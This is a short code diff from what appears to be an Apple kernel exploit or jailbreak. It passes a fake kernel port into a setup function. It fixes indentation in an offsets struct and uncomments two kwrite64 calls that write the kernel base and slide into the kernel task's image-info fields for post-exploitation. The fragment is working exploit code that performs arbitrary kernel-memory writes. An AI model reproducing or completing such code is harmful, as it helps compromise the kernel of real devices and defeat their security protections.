@@ -80,8 +80,8 @@ typedef struct {
         uint32_t itk_registered;
         uint32_t ipr_size;
         uint32_t sizeof_task;
-		uint32_t task_all_image_info_addr;
-		uint32_t task_all_image_info_size;
+        uint32_t task_all_image_info_addr;
+        uint32_t task_all_image_info_size;
     } struct_offsets;
 
     struct {
@@ -472,11 +472,9 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
 
     LOG("kern_task_addr: %llx", kern_task_addr);
 
-	/*
 	// setup kernel base and slide for post
 	kwrite64(kern_task_addr + offsets->struct_offsets.task_all_image_info_addr,offsets->constant.kernel_image_base + kslide);
 	kwrite64(kern_task_addr + offsets->struct_offsets.task_all_image_info_size,kslide);
-	*/
 
 	mach_vm_address_t remap_addr = 0x0;
     vm_prot_t cur = 0x0, max = 0x0;
